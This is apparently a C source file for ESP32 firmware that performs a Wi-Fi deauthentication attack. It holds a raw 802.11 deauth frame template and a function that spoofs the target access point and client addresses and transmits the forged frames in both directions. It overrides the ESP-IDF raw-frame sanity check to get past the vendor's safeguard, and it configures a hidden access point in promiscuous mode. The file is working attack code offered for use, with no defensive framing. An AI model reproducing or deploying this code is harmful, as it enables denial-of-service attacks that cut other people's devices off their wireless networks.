/*
 * deauth_attack.c
 *
 *  Created on: 25 May 2025
 *      Author: HP
 */

#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_system.h"
#include "deauth_attack.h"

#define TAG "DeauthAttack"

// Deauthentication frame template (26 bytes)
static uint8_t deauth_frame_default[26] = {
    0xc0, 0x00, // Frame Control:
    0x3a, 0x01, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination Address (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0xf0, 0xff, 
    0x02, 0x00 
};

// Bypass ESP-IDF safety sanity check for raw frame transmission
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
    // Set WiFi channel
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set channel %d: %s", channel, esp_err_to_name(err));
        return;
    }
    vTaskDelay(1 / portTICK_PERIOD_MS);

    // Build AP source packet
    deauth_frame_default[4] = mac[0];  // Destination Client MAC
    deauth_frame_default[5] = mac[1];
    deauth_frame_default[6] = mac[2];
    deauth_frame_default[7] = mac[3];
    deauth_frame_default[8] = mac[4];
    deauth_frame_default[9] = mac[5];

    deauth_frame_default[10] = bssid[0]; // Source AP BSSID
    deauth_frame_default[11] = bssid[1];
    deauth_frame_default[12] = bssid[2];
    deauth_frame_default[13] = bssid[3];
    deauth_frame_default[14] = bssid[4];
    deauth_frame_default[15] = bssid[5];

    deauth_frame_default[16] = bssid[0]; // BSSID
    deauth_frame_default[17] = bssid[1];
    deauth_frame_default[18] = bssid[2];
    deauth_frame_default[19] = bssid[3];
    deauth_frame_default[20] = bssid[4];
    deauth_frame_default[21] = bssid[5];

    // Send packet
    err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send AP-to-client deauth frame: %s", esp_err_to_name(err));
    }

    deauth_frame_default[4] = bssid[0];  // Destination: AP BSSID
    deauth_frame_default[5] = bssid[1];
    deauth_frame_default[6] = bssid[2];
    deauth_frame_default[7] = bssid[3];
    deauth_frame_default[8] = bssid[4];
    deauth_frame_default[9] = bssid[5];

    deauth_frame_default[10] = mac[0]; // Source: Client MAC
    deauth_frame_default[11] = mac[1];
    deauth_frame_default[12] = mac[2];
    deauth_frame_default[13] = mac[3];
    deauth_frame_default[14] = mac[4];
    deauth_frame_default[15] = mac[5];

    deauth_frame_default[16] = mac[0]; // BSSID
    deauth_frame_default[17] = mac[1];
    deauth_frame_default[18] = mac[2];
    deauth_frame_default[19] = mac[3];
    deauth_frame_default[20] = mac[4];
    deauth_frame_default[21] = mac[5];

    // Send packet
    err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send client-to-AP deauth frame: %s", esp_err_to_name(err));
    }

    ESP_LOGI(TAG, "Deauth attack sent to BSSID %02X:%02X:%02X:%02X:%02X:%02X on channel %d",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
}

void start_deauth_attack() {
    // Set WiFi mode to AP and enable promiscuous mode
    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set WiFi mode to AP: %s", esp_err_to_name(err));
        return;
    }
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "Hidden",
            .ssid_len = strlen("Hidden"),
			.ssid_hidden = 1,
            .channel = 1,
            .password = "password",
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to enable promiscuous mode: %s", esp_err_to_name(err));
        return;
    }


    ESP_LOGI(TAG, "Deauth attack configured (promiscuous mode enabled)");
}
